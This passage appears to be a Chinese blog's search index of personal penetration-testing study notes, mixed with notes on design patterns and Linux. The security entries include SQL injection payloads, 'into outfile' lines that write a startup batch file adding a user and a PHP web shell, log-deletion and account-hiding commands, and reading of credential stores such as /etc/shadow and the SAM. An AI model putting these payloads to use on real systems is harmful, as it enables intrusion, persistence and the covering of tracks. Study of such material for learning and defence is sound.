攻击者利用应用程序根据提交的数据动态生成sal命令的特性，在url、表单域或者其他的输入域中输入自己的sql命令，改变sql命令的操作，将被修改的sql命令注入到后端数据库引擎中执行。\n##### 危害 #####\n  1. 数据库信息泄漏\n  2. 网页篡改\n  3. 挂马\n  4. 服务器被远程控制\n  5. 瘫痪全系统\n\n\n##### 常用sql语句 #####\n  + 判断数据库\n    + `and exsits(select * from msysobjects)>0 ` access\n    + `and exsits(select * from sysobjects)>0  ` sqlserver\n  + 判断数据库表\n    + ` and exists(select * from admin)`\n  + 判断数据库列名\n    + `and exists(select admin from admin)`\n  + 判断数据字段内容的长度\n    + `and (select len(admin) from admin)=5 ` 如果返回正常说明管理员账户的长度为5\n  + 判断数据第一个字符内容\n    + and (select top 1 asc(mid(admin,1,1)) from admin)>100 返回正常说明该字符的ascii码值大于100\n\n\n##### 偏移注入 #####\n  偏移注入的产生主要是用来解决表名猜到，列名猜不到的情况。使用的sql语句为\n  ` http://127.0.0.1:33/0/simple.asp?id=22 union select 1,2,3,4,5,6,7,8 from admin `\n\n+ 利用注入漏洞执行系统命令\n  + 第一种方法： 需要有系统权限\n    ` and 1 = 2 union select 1, \"net user seven 123 /add\", 2,3,4 into outfile 'C://Documments and Settings/Administrator/[开始] 菜单/程序/启动/1.bat' `\n\n  + 第二种方法\n    ` and 1 = 2 union select 1, \"<pre><body><?@system($_GET['cc']);?></body></pre>\",3,4,5,6,7 into outfile 'C:/Inetpub/wwwroot/mysql-sql/cr.php' `\n\n\n##### ORACLE #####\n1. 执行java代码\n2. 补充。。。。\n\n#### MYSQL #####\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"httpfuzzer","url":"%2F2018%2F12%2F24%2Fhttpfuzzer%2F"},{"title":"cms","url":"%2F2018%2F12%2F24%2Fcms%2F","content":"\n网站常见后台有：\n+ 织梦\n+ discuz\n+ 帝国\n+ phpweb\n+ wordpress\n+ aspcms\n+ 科讯\n+ 南方\n+ 良精\n+ ecshop\n\n常见默认管理页面：\n+ admin\n+ admin.php\n+ wp-admin\n+ manager\n+ login_admin\n+ login_manager\n+ login.asp\n+ houtai\n+ denglu\n","tags":["后台管理"],"categories":["网络安全"]},{"title":"下载漏洞","url":"%2F2018%2F12%2F24%2F%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E%2F","content":"\n下载漏洞利用：\n+ 通过蜘蛛爬行\n+ 找到该url\n+ 下载conn.asp、 config.php、 config.asp db.mdb等\n","tags":["漏洞利用"],"categories":["网络安全"]},{"title":"爆库","url":"%2F2018%2F12%2F24%2F%E7%88%86%E5%BA%93%2F","content":"\n1. 在文件名后面加::$data 有可能爆出源码，例如：` http://127.0.0.1:2299/xyconn.asp::$data `\n2. 爆库绕过防下载\n  1. ` #sdsf.mdb 下载时改为%23sdsf.mdb`\n  2. ` #@!$%^&*asdfkladsf@!#.mdb `\n  3. ` %23@%21%24%255E%26%2aasdfkladsf@%21%23.mdb`\n3. 高级语法爆库\n  1. inurl:./..admin../..add..\n  2. inurl:./..admin../..del..\n  3. inurl:/.asp<id=<%<%<%\n","tags":["数据库"],"categories":["网络安全"]},{"title":"CDN绕过","url":"%2F2018%2F12%2F19%2FCDN%E7%BB%95%E8%BF%87%2F","content":"\n+ 什么是CDN\n+ 如何判断网站有没有使用CDN（超级ping）\n+ 查找二级域名\n+ 让服务器主动给你发包（邮件）\n+ 敏感文件泄漏\n+ 查询历史解析ip\n+ 访问绕过cdn（修改hosts文件）\n","tags":["原理"],"categories":["网络安全"]},{"title":"AWVS","url":"%2F2018%2F12%2F19%2FAWVS%2F","content":"\n\n+ 常见功能\n  + 网站爬行\n  + 漏洞扫描\n  + 目标发现\n  + 子域名扫描\n  + http编辑\n  + http嗅探\n  + http模糊测试\n  + 认证测试\n  + 网络服务扫描器\n","tags":["工具"],"categories":["网络安全"]},{"title":"常见端口","url":"%2F2018%2F12%2F17%2F%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3%2F","content":"\n\n|              端口号                |            描述               |                           漏洞                                             |                        工具                  |\n|:---------------------------------:|:----------------------------:|:--------------------------------------------------------------------------:|:-------------------------------------------:|\n|   21                              |  ftp协议代理服务器常用端口       |       默认用户名密码：anonymous:anonymous    , 爆破                           |                                             |\n|   22                              |  ssh scp                     |       暴力破解                                                              | 爆破工具：hydra，medusa;连接工具：putty，winscp  |\n|   23                              |  telnet协议代理服务器常用端口    |       爆破                                                                 |                                              |\n|   25                              |  smtp 默认的端口（木马Antigen Email Password Sender, Haebu Coceda, Shtrilitz Stealth , WinPC ,WinSpy都开放这个端口）  |   邮件欺骗，垃圾邮件转发、使用VRFY枚举用户列表   |  |\n|   31                              |  木马Master Paradise、Hackers Pardadise 开放 |                                                             |                                               |\n|   53/udp                          |  DNS服务                      |      DNS域传送、针对dns的拒绝服务攻击、枚举二级域名，泄漏域名信息                  |  dnsenum, nslookup, dig, fierce               |\n|   69                              |  tftp默认端口                  |      爆破，未授权访问                                                       |                                               |\n|   80/443/3128/8080/8081/8443/9081 |  http协议代理服务器常用端口      |                                                                            |                                              |\n|   109                             |  POP3服务                     |       缓冲区溢出                                                             |                                              |\n|   111                             |  RPC远程过程调用协议            |                                                                            |                                              |\n|   123/udp                         |  NTP网络时间协议                |                                                                           |                                              |\n|   137/139/445                     |  SMB通信协议                    |                                                                           |                                             |\n|   161/udp                         |  SNMP简单网络管理协议            |      默认社区字符串，枚举MIB                                                  |    snmpwalk，snmpenum                       |\n|   1080/udp                        |  qq默认端口                     |                                                                           |                                             |\n|   1433/udp/tcp                    |  sqlserver默认端口              |     暴力破解                                                               |                                             |\n|   1521                            |  oracle数据库默认端口            |     暴力破解，枚举数据库工具                                                 |   枚举工具：Tnsver、Tnscmd                     |\n|   3306                            |  mysql的默认端口                |     暴力破解                                                              |                                              |\n|   3389                            |  win2003远程登录默认端口(RDP协议) |     暴力破解                                                             |                                               |\n|   3389                            |  mstsc的默认端口                |                                                                         |                                               |\n|   5060                            |  SIP会话初始协议                |                                                                         |   Sipflanker,Sipscan                          |\n|   8080                            |  tomcat默认的端口号             |                                                                         |                                               |\n|   9090                            |  websphere的默认端口            |                                                                          |                                            ||\n","tags":["原理"],"categories":["网络安全"]},{"title":"windows使用入门","url":"%2F2018%2F12%2F16%2Fwindows%E4%BD%BF%E7%94%A8%E5%85%A5%E9%97%A8%2F","content":"\n1. netstat命令\n    + netstat -a 查看开启了端口\n    + netstat -n 查看端口的网络连接情况，常用netstat -an\n    + netstat -v 查看正在进行的工作\n\n2. at命令\n    + at id号 开启已经注册的某个计划任务\n    + at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止\n    + at id号 /delete 停止某个已注册的计划任务\n    + at 查看所有的计划任务\n3. attrib命令\n    + attrib 文件名（目录名）  查看某文件（目录）的属性\n    + attrib 文件名 +或- 添加文件或目录的属性  A存档  R 只读 S系统  H隐藏 例如 ` attrib test.txt +H `\n4. net命令\n  + net user 用户名 密码  /add 建立用户\n  + net user guest /active:yes 激活guest账户\n  + net user 查看有哪些账户\n  + net user 账户名 查看账户的属性\n  + net localGroup administrators 用户名 /add 把用户添加到管理员中使其具有管理员权限（administrator后加s表示复数）\n  + net user guest 12345 将guest用户的密码改为12345\n  + net passwd 密码 更改系统登录密码\n  + net share 查看本地开启的共享\n  + net share ipc5 开启ipc5共享\n  + net share ipc5 /del 删除ipc5共享\n  + net start 查看开启了哪些服务\n  + net start 服务名   开启服务\n  + net stop 服务名   停止服务\n  + net view 查看局域网内其他计算机名称\n5. copy命令\n6. move命令\n7. telnet命令\n8. dir命令\n9. cd命令\n10. start命令\n11. md命令 创建目录\n12. rd命令 删除目录\n13. ren命令 重命名文件\n14. del命令 删除文件\n15. 死亡之ping  ping -t -l 65550 ip\n16. ipconfig命令\n  + ipconfig /release 释放ip\n  + ipconfig /renew 重新获得ip\n\n17. 注册表结构\n  + HKEY_CLASSES_ROOT  管理文件系统，根据在windows中安装的应用程序的扩展名，该根键指明其文件类型的名称，相应打开该文件所要调用的程序等等信息。\n  + HKEY_CURRENT_USER  管理系统当前的用户信息，在这个根键中保存了本地计算机中存放的当前登录的用户信息，包括用户名和暂存的密码，在用户登录windows时，其信息从HKEY_USERS中相应的项拷贝到HKEY_CURRENT_USER中\n  + HKEY_LOCAL_MACHINE 管理当前系统硬件配置，在这个根键中保存了本地计算机硬件配置数据，此根键下的子关键字包括在SYSTEM.DAT中，用来提供HKEY_LOCALMACHINE所需的信息，或者在远程计算机中可访问的一组键中。这个根键中许多子键和system.ini文件中设置项类似。\n  + HKEY_USERS  管理系统的用户信息。在这个根键中保存了存放在本地计算机口令列表中的用户标识和密码列表。同时每个用户的预配置信息都存储在HKEY_USERS根键中。HKEY_USERS是远程计算机中访问的根键之一。\n  + HKEY_CURRENT_CONFIG  管理当前用户的系统配置。在这个根键中保存着定义当前用户桌面配置（如显示器）的数据，该用户使用过的文档列表（MRU），应用程序配置和其他有关当前用户的windows的安装的信息。\n","tags":["系统使用"],"categories":["网络安全"]},{"title":"隐藏痕迹","url":"%2F2018%2F12%2F15%2F%E9%9A%90%E8%97%8F%E7%97%95%E8%BF%B9%2F","content":"1. 禁止在登录界面显示新建帐号\n2. REG ADD “HKEY——LOCAL——MACHINE、SOFTWARE、Microsoft\\Windows NT\\CurrentVersion\\WinLogon\\SpecialAccounts\\UserList” /v uname /T REG_DWORD /D 0\n3. del %WINDIR%\\*.log /a/s/q/f\n4. History\n5. 日志\n  + auth.log /secure\n  + btmp / wtmp\n  + lastlog / faillog\n6. 其他日志和HIDS等\n","tags":["原理"],"categories":["网络安全"]},{"title":"linux基本信息收集","url":"%2F2018%2F12%2F15%2Flinux%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F","content":"\n1. /etc/resolv.conf\n2. /etc/passwd\n3. /etc/shadow\n4. /etc, /usr/local/etc\n5. .ssh , .gnupg\n6. /tmp\n7. whoami, who -a\n8. ifconfig -a , iptables -L -n , netstat -rn\n9. uname -a , ps aux\n10. dpkg -l | head\n","tags":["工具"],"categories":["网络安全"]},{"title":"windows基本信息收集","url":"%2F2018%2F12%2F15%2Fwindows%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F","content":"\n\n1. ipconfig /all, ipconfig /displaydns, netstat -bnao, netstat -r\n2. net view, net view /domain\n3. net user /domain, net user %username% /domain\n4. net accounts, net share\n5. net localgroup administrators username /add\n6. net group \"Domain Controllers\" /domain\n\n\n1. net share name$=C:\\/unlimited\n2. net user username /active:yes /domain\n\n1. SAM数据库 ，注册表文件\n2. %SYSTEMROOT%\\repair\\SAM\n3. %SYSTEMROOT%\\System32\\config\\RegBack\\SAM\n4. 业务数据库 ； 身份认证数据库\n5. 临时文件目录\n6. UserProfile\\AppData\\Local\\Microsoft\\Window\\Temporary Internet Files\\\n\n注册表信息：\n\n1. HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mysqlpass\n2. HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mssqlpss\n3. HKEY_LOCAL_MACHINE\\software\\hzhost\\config\\settings\\mastersvrpass\n4. HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFT\\INSTALLFREEADMIN\\11\n5. HKEY_LOCAL_MACHINE\\SYSTEM\\LIWEIWENSOFT\\INSTALLFreeHost\\11\n","tags":["工具"],"categories":["网络安全"]},{"title":"基本信息收集","url":"%2F2018%2F12%2F12%2F%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F","content":"\n+ Linux下\n  + /etc/resolv.conf\n  + /etc/passwd\n  + /etc/shadow\n\n  whoami 或者who -a\n  ifconfig -a iptables -L -n\n  uname -a 或者iptables -L -n setstat -m\n\n\n\n\n-------------------\n\n+ 后台查找\n  1. 弱口令默认后台： admin, admin/login.asp, manage, login.asp等常见后台\n  2. 查看网页的链接： 一般来说， 网站的主页有管理登录类似的东西，有些可能被管理员已经删掉\n  3. 查看网站图片的属性\n  4. 查看网站使用的管理系统，从而确定后台\n  5. 用工具查找：wwwscan， intellitamper，御剑\n  6. robots.txt的帮助： robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看。\n  7. GoogleHacker\n  8. 查看网站使用的编辑器是否有后台\n  9. 短文件利用\n  10. sqlmap --sql-shell load_file('d:/wwroot/index.php');\n\n+ url采集\n  采集相关url的同类网站\n  1. 例如php?id=\n  2. 漏洞网站\n  3. url采集器\n\n+ 整站分析\n  1. 服务器类型\n    + 服务器平台，版本等\n  2. 网站容器\n    + 搭建网站的服务组件，例如： iis， apache， nginx， tomcat等\n  3. 脚本类型\n    + asp，php，jsp，axpx等\n  4. 数据库类型\n    + access， sqlserver, mysql, oracle, postgresql\n  5. cms类型\n  6. waf\n\n+ 敏感目录\n  1. 收集方向\n    + robots.txt, 后台目录， 安装包， 上传目录， mysql管理接口， 安装页面， phpinfo， 编辑器，iis短文件\n  2. 常用工具\n    + 字典爆破：御剑，dirbuster, wwwscan, IIS_shortname_Scanner等\n    + 蜘蛛爬行：爬行菜刀， webrobot，burp\n\n+ 域名信息\n  1. 对应ip收集\n    + 相关域名对应的ip， 相关工具：nslookup\n  2. 子域名收集\n    + 工具：layer,subDomainsBrute\n  3. whois信息查询\n    + 根据已知域名反查，分析此域名的注册人，邮箱，电话等\n    + 工具：爱站网， 站长工具，微步在线（https://x.threatbook.cn）\n            site.ip138.com,    searchdns.netcraft.com\n","tags":["原理"],"categories":["网络安全"]},{"title":"http请求方法","url":"%2F2018%2F12%2F12%2Fhttp%E8%AF%B7%E6%B1%82%E6%96%B9%E6%B3%95%2F","content":"\n+ Get方法\n+ Post方法\n+ Options方法\n+ Put方法\n+ Move方法\n+ Delete方法\n+ Trace方法\n","tags":["web安全"],"categories":["网络安全"]},{"title":"渗透测试流程","url":"%2F2018%2F12%2F12%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%2F","content":"\n+ 明确目标\n+ 信息收集\n+ 漏洞探测\n+ 漏洞验证\n+ 编写报告\n+ 信息整理\n+ 获取所需\n+ 信息分析\n","tags":["漏洞利用"],"categories":["网络安全"]},{"title":"设计模式的分类","url":"%2F2018%2F12%2F12%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%88%86%E7%B1%BB%2F","content":"\n+ 组建协作\n  + Template Method\n  + Strategy\n  + Observer / Event\n+ 单一职责\n  + Decorator\n  + Bridge\n+ 对象创建\n  + Factory Method\n  + Abstract Factory\n  + Prototype\n  + Builder\n+ 对象性能\n  + Singleton\n  + Flyweight\n+ 接口隔离\n  + Facade\n  + Proxy\n  + Mediator\n  + Adapter\n+ 状态变化\n  + Memento\n  + State\n+ 数据结构\n  + Composite\n  + Iterator\n  + Chain of Resposibility\n+ 行为变化\n  + Command\n  + Visitor\n+ 领域问题\n  + Interpreter\n","tags":["设计模式"],"categories":["代码设计"]},{"title":"设计模式原则","url":"%2F2018%2F12%2F12%2F%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E5%85%AB%E5%A4%A7%E5%8E%9F%E5%88%99%2F","content":"\n###### 设计模式的原则 ######\n  1. 依赖倒置原则（DIP  Dependence Inversion Principle）\n      这个原则是开闭原则的基础，具体内容：针对接口编程，依赖于抽象而不依赖于具体。\n  2. 开闭原则（OCP   Open Close Principle）\n      开闭原则的意思是：对扩展开放，对修改关闭。在程序需要进行拓展的时候，不能去修改原有的代码，实现一个热插拔的效果。简言之，是为了使程序的扩展性好，易于维护和升级。想要达到这样的效果，我们需要使用接口和抽象类，后面的具体设计中我们会提到这点。\n\n  3. 单一职责原则（SRP）\n  4. Liskov替换原则（LSP  Liskov Substitution Principle）\n      里氏代换原则是面向对象设计的基本原则之一。 里氏代换原则中说，任何基类可以出现的地方，子类一定可以出现。LSP 是继承复用的基石，只有当派生类可以替换掉基类，且软件单位的功能不受到影响时，基类才能真正被复用，而派生类也能够在基类的基础上增加新的行为。里氏代换原则是对开闭原则的补充。实现开闭原则的关键步骤就是抽象化，而基类与子类的继承关系就是抽象化的具体实现，所以里氏代换原则是对实现抽象化的具体步骤的规范。\n\n  5. 接口隔离原则（ISP   Interface Segregation Principle）\n    这个原则的意思是：使用多个隔离的接口，比使用单个接口要好。它还有另外一个意思是：降低类之间的耦合度。由此可见，其实设计模式就是从大型软件架构出发、便于升级和维护的软件设计思想，它强调降低依赖，降低耦合。\n  6. 合成复用原则（Composite Reuse Principle）\n    合成复用原则是指：尽量使用合成/聚合的方式，而不是使用继承。\n\n  7. 迪米特法则，又称最少知道原则（Demeter Principle）\n    最少知道原则是指：一个实体应当尽量少地与其他实体之间发生相互作用，使得系统功能模块相对独立。\n\n\n###### 设计模式的应用场景 ######\n  下面阐述了一些导致重新设计的一般原因，以及解决这些问题的设计模式：\n  1. 通过显式地指定一个类来创建对象 在创建对象时指定类名将使你受特定实现的约束, 而不是特定接口的约束。这会使未来的变化更复杂。要避免这种情况，应该间接地创建对象。\n    设计模式： Abstract Factory(3.1)， Factory Method(3.3)， Prototype(3.4)。\n  2.  对特殊操作的依赖 当你为请求指定一个特殊的操作时，完成该请求的方式就固定下来了。为避免把请求代码写死，你将可以在编译时刻或运行时刻很方便地改变响应请求的方法。\n    设计模式： Chain of Resposibility(5.1)， Command(5.2)。\n  3. 对硬件和软件平台的依赖 外部的操作系统接口和应用编程接口 (API)在不同的软硬件平台上是不同的。依赖于特定平台的软件将很难移植到其他平台上，甚至都很难跟上本地平台的更新。所以设计系统时限制其平台相关性就很重要了。\n    设计模式： Abstract Factory(3.1)， Bridge(4.2)。\n  4.  对对象表示或实现的依赖 知道对象怎样表示、保存、定位或实现的客户在对象发生\n    变化时可能也需要变化。对客户隐藏这些信息能阻止连锁变化。\n    设计模式： Abstract Factory(3.1)， Bridge(4.2)，Memento(5.6)，Proxy(4.7)\n  5.  算法依赖 算法在开发和复用时常常被扩展、优化和替代。依赖于某个特定算法的对象在算法发生变化时不得不变化。因此有可能发生变化的算法应该被孤立起来。\n    设计模式： Builder(3.2)，Iterator(5.4)，Strategy(5.9) ，Template Method(5.10) ，Visitor (5.11)\n  6.  紧耦合 紧耦合的类很难独立地被复用，因为它们是互相依赖的。紧耦合产生单块的系统，要改变或删掉一个类，你必须理解和改变其他许多类。这样的系统是一个很难学习、移植和维护的密集体。松散耦合提高了一个类本身被复用的可能性，并且系统更易于学习、移植、修改和扩展。设计模式使用抽象耦合和分层技术来提高系统的松散耦合性。\n    设计模式： Abstract Factory(3.1) ， Command(5.2)，Facade(4.5)，Mediator(5.5)，Observer(5.7) ， Chain of Responsibility(5.1)。\n  7.  通过生成子类来扩充功能 通常很难通过定义子类来定制对象。每一个新类都有固定的实现开销(初始化、终止处理等 )。定义子类还需要对父类有深入的了解。如，重定义一个操作可能需要重定义其他操作。一个被重定义的操作可能需要调用继承下来的操作。并且子类方法会导致类爆炸，因为即使对于一个简单的扩充，你也不得不引入许多新的子类。一般的对象组合技术和具体的委托技术，是继承之外组合对象行为的另一种灵活方法。新的功能可以通过以新的方式组合已有对象，而不是通过定义已存在类的子类的方式加到应用中去。另一方面，过多使用对象组合会使设计难于理解。许多设计模式产生的设计中，你可以定义一个子类，且将它的实例和已存在实例进行组合来引入定制的功能。\n    设计模式： Bridge (4.2)， Chain of Responsibility(5.1)， Composite(4.3)，Decorator(4.4)，Observer(5.7)，Strategy(5.9)。\n  8.  不能方便地对类进行修改 有时你不得不改变一个难以修改的类。也许你需要源代码而又没有(对于商业类库就有这种情况 )，或者可能对类的任何改变会要求修改许多已存在的其他子类。设计模式提供在这些情况下对类进行修改的方法。\n    设计模式： Adapter(4.1)，Decorator(4.4)，Visitor(5.11)\n\n| 序号        | 模式 & 描述       | 包括  |\n| ------------- |:-------------:| -----:|\n| 1.  | 创建型模式:这些设计模式提供了一种在创建对象的同时隐藏创建逻辑的方式，而不是使用 new 运算符直接实例化对象。这使得程序在判断针对某个给定实例需要创建哪些对象时更加灵活。| 工厂模式（Factory Pattern）抽象工厂模式（Abstract Factory Pattern）单例模式（Singleton Pattern）建造者模式（Builder Pattern）原型模式（Prototype Pattern） |\n| 2. | 结构型模式这些设计模式关注类和对象的组合。继承的概念被用来组合接口和定义组合对象获得新功能的方式。| 适配器模式（Adapter Pattern）桥接模式（Bridge Pattern）过滤器模式（Filter、Criteria Pattern）组合模式（Composite Pattern）装饰器模式（Decorator Pattern）外观模式（Facade Pattern）享元模式（Flyweight Pattern）代理模式（Proxy Pattern）|\n|3.  |行为型模式这些设计模式特别关注对象之间的通信。| 责任链模式（Chain of Responsibility Pattern）命令模式（Command Pattern）解释器模式（Interpreter Pattern）迭代器模式（Iterator Pattern）中介者模式（Mediator Pattern）备忘录模式（Memento Pattern）观察者模式（Observer Pattern）状态模式（State Pattern）空对象模式（Null Object Pattern）策略模式（Strategy Pattern）模板模式（Template Pattern）访问者模式（Visitor Pattern）|\n| 4. |J2EE 模式这些设计模式特别关注表示层。这些模式是由 Sun Java Center 鉴定的。| MVC 模式（MVC Pattern）业务代表模式（Business Delegate Pattern）组合实体模式（Composite Entity Pattern）数据访问对象模式（Data Access Object Pattern）前端控制器模式（Front Controller Pattern）拦截过滤器模式（Intercepting Filter Pattern）服务定位器模式（Service Locator Pattern）传输对象模式（Transfer Object Pattern） |\n\n###### 设计模式的使用 ######\n1. 考虑设计模式是怎样解决设计问题的。设计模式怎样帮助你找到合适的对象、决定对象的粒度、指定对象接口以及设计模式解决设计问题的几个其他方法。参考这些讨论会有助于你找到合适的模式。\n2. 浏览模式的意图部分 1 . 4节列出了目录中所有模式的意图 (intent)部分。通读每个模式的意图，找出和你的问题相关的一个或多个模式。\n3. 研究模式怎样互相关联以图形方式显示了设计模式之间的关系。研究这些关系能指导你获得合适的模式或模式组。\n4. 研究目的相似的模式。\n5. 检查重新设计的原因 看一看从“设计应支持变化”小节开始讨论的引起重新设计的各种原因，再看看你的问题是否与它们有关，然后再找出哪些模式可以帮助你避免这些会导致重新设计的因素。\n6. 考虑你的设计中哪些是可变的 这个方法与关注引起重新设计的原因刚好相反。它不是考虑什么会迫使你的设计改变，而是考虑你要什么变化却又不会引起重新设计。最主要的一点是封装变化的概念，这是许多设计模式的主题。\n\n\n 1. 大致浏览一遍模式 特别注意其适用性部分和效果部分，确定它适合你的问题。\n 2. 回头研究结构部分、参与者部分和协作部分 确保你理解这个模式的类和对象以及它们是怎样关联的。\n 3. 看代码示例部分，看看这个模式代码形式的具体例子 研究代码将有助于你实现模式。\n 4. 选择模式参与者的名字，使它们在应用上下文中有意义 设计模式参与者的名字通常过于抽象而不会直接出现在应用中。然而，将参与者的名字和应用中出现的名字合并起来是很有用的。这会帮助你在实现中更显式的体现出模式来。例如，如果你在文本组合算法中使用了Strategy模式，那么你可能有名为 SimpleLayoutStrategy或TeXLayoutStrategy这样的类。\n 5. 定义类, 声明它们的接口，建立它们的继承关系，定义代表数据和对象引用的实例变量。识别模式会影响到的你的应用中存在的类，做出相应的修改。\n 6. 定义模式中专用于应用的操作名称 这里再一次体现出，名字一般依赖于应用。使用与每一个操作相关联的责任和协作作为指导。还有，你的名字约定要一致。例如，可以使用“ Create-”前缀统一标记Factory方法。\n 7. 实现执行模式中责任和协作的操作 实现部分提供线索指导你进行实现。代码示例部分的例子也能提供帮助。\n 这些只对你一开始使用设计模式起到指导作用，以后你会有自己的设计模式使用方法。\n\n+ 通常你通过引入额外的间接层次获得灵活性和可变性的同时，你也使设计变得更复杂并 /或牺牲了一定的性能。一个设计模式只有当它提供的灵活性是真正需要的时候，才有必要使用。当衡量一个模式的得失时，它的效果部分是最能提供帮助的。\n\n\n###### 不使用设计模式的条件 ######\n  + 代码可读性很差的时候\n  + 需求理解还非常浅的时候\n  + 变化还没有显现的时候\n  + 不是系统的关键依赖点\n  + 项目没有复用价值时\n  + 项目即将要发布的时候\n\n\n###### 设计模式成长之路 ######\n  1. 见模式而不知\n  2. 可以识别模式，作为应用开发人员使用模式\n  3. 作为框架开发人员为应用设计某些模式\n  4. 忘掉模式，只有原则\n","tags":["设计模式"],"categories":["代码设计"]},{"title":"漏洞利用流程","url":"%2F2018%2F12%2F08%2F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%B5%81%E7%A8%8B%2F","content":"\n漏洞利用后阶段\n\n+ 上传工具\n+ 提权\n+ 擦除攻击痕迹\n+ 安装后门\n  + 长期控制\n  + Dump 密码\n  + 内网渗透\n+ 后漏洞利用阶段\n  + 最大的挑战——防病毒软件\n  + 使用合法的远程控制软件\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"弱点扫描","url":"%2F2018%2F12%2F08%2F%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F%2F","content":"\n1. 主动扫描\n  + 有身份验证\n  + 无身份验证\n2. 被动扫描\n  + 镜像端口抓包\n  + 其他来源输入\n3. 基于Agent的扫描\n  + 支持平台有限\n","tags":["原理"],"categories":["网络安全"]},{"title":"命令行连接无线","url":"%2F2018%2F12%2F08%2F%E5%91%BD%E4%BB%A4%E8%A1%8C%E8%BF%9E%E6%8E%A5%E6%97%A0%E7%BA%BF%2F","content":"\n自从由mate转i3之后。。。。还是学一下咋用命令行连无线吧。。。毕竟家里穷，买不起鼠标。。。。。\n\n1. 查看可以使用的无线网\n\n`nmcli device wifi`\n\n2. 连接无线网\n\n`nmcli device wifi connect essid（即无线网名称） password password `\n\n3. 如果essid和密码没有输入错误的话，那么现在应该是已经连接成功了。。。[装逼成功]     \n","tags":["parrot使用"],"categories":["Linux"]},{"title":"漏洞基本概念","url":"%2F2018%2F12%2F05%2F%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%2F","content":"\n1. SCAP(Security Content Automation Protocol)\n  + SCAP是一个集合了多种安全标准框架\n  + 其中含有六个元素：CVE、OVAL、CCE、CPE、CVSS、XCCDF\n  + 目的是以标准的方法展示和操作安全数据\n  + 由NIST负责维护\n  + 解决的三个问题\n    + 实现高层政策法规等到底层实施的落地（如FISMA、ISO27000系列）\n    + 将信息安全所涉及的各个要素标准化（如统一漏洞的命名以及严重性度量）\n    + 将复杂的系统配置核查自动化\n\n\n2. NVD （National Vulnerability Database）\n  + 美国政府的漏洞管理标准数据\n  + 完全基于SCAP框架\n  + 实现自动化漏洞管理、安全测量、合规要求\n  + 包含以下库\n    + 安全检查列表\n    + 软件安全漏洞\n    + 配置错误\n    + 产品名称\n    + 影响度量\n  + 网址 https://nvd.nist.gov/\n\n3. OVAL（Open Vulnerability and Assessment Language）\n  + 描述漏洞检测方法的机器可识别语言\n  + 详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作\n  + OVAL使用XML语言描述，包含了严密的语法逻辑\n\n4. CCE\n  + 描述软件配置缺陷的一种标准化格式\n  + 在信息安全风险评估中，配置缺陷的检测是一项重要内容，使用CCE可以让配置缺陷以标准的方式展现出来，便于配置缺陷评估的可量化操作\n\n5. CPE（Common Product Enumeration）\n  + 信息技术产品、系统、软件包的结构化命名规范，分类命名\n\n6. CWE（Common Weakness Enumeration）\n  + 常见的漏洞类型的字典，描述不同类型漏洞的特征（访问控制，信息泄漏，拒绝服务）\n\n7. CVSS （Common Vulnerability Scoring System）\n  + CVSS是安全内容自动化协议（SCAP）的一部分\n  + 通常CVSS和CVE一同由美国国家漏洞库（NVD）发布并保持数据的更新\n  + 分值范围由0-10\n  + 不同机构按照CVSS分值定义威胁的中高低威胁级别\n  + CVSS体现弱点的风险，威胁级别表示弱点风险对企业的影响程度\n  + CVSS分值是工业标准，但是威胁级别不是\n  + 描述安全漏洞严重程度的统一评分方案\n  + Basic Metric ：基础的恒定不变的弱点权重\n  + Temporal Metric: 依赖时间因素的弱点权重\n  + Enviromental Metric: 利用弱点的环境要求和实施难度的权重\n\n8. CVE (Common Vulnerabilities and Exposures)\n  + 已公开的信息安全漏洞字典，统一的漏洞编号标准\n  + MITRE公司负责维护（非盈利机构）\n  + 扫描器的大部分扫描项都对应一个CVE编号\n  + 可以实现不同厂商之间信息交换的统一标准\n\n8. 常见的Vulnerability Reference\n  + MS\n\n  + CERT\n  + BID\n  + IAVM\n  + OVAL\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"OPENVAS","url":"%2F2018%2F12%2F05%2FOPENVAS%2F","content":"\n\n1. 配置步骤\n  + 安装\n  + 创建证书\n  + 同步弱点数据库\n  + 创建客户端证书\n  + 重建数据库\n  + 备份数据库\n  + 启动服务装入插件\n  + 创建管理员帐号\n  + 创建普通用户帐号\n  + 配置服务侦听端口\n  + 安装验证\n","tags":["漏洞扫描"],"categories":["网络安全"]},{"title":"WAF","url":"%2F2018%2F12%2F05%2FWAF%2F","content":"\nWEB应用防火墙\n+ wafw00f 域名\n\n负载均衡识别：\n  + lbd www.xxx.com\n  \n","tags":["原理"],"categories":["网络安全"]},{"title":"负载均衡","url":"%2F2018%2F12%2F05%2F%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%2F","content":"\n\n+ 广域网负载均衡使用DNS\n\n+ HTTP-Loadbalancina\n  + Nginx\n  + Apache\n\nlbd  域名\n","tags":["原理"],"categories":["网络安全"]},{"title":"SNMP原理","url":"%2F2018%2F12%2F04%2FSNMP%E5%8E%9F%E7%90%86%2F","content":"\nServer Message Block 协议\n\n+ 微软历史上出现安全问题最多的协议\n+ 实现复杂\n+ 默认开放\n+ 文件共享\n+ 空会话为认证身份访问（SMB1）\n  + 密码策略\n  + 用户名\n  + 组名\n  + 机器名\n  + 用户、组ID\n\n版本：\n+ SMB1 Windows 2000/xp/windows 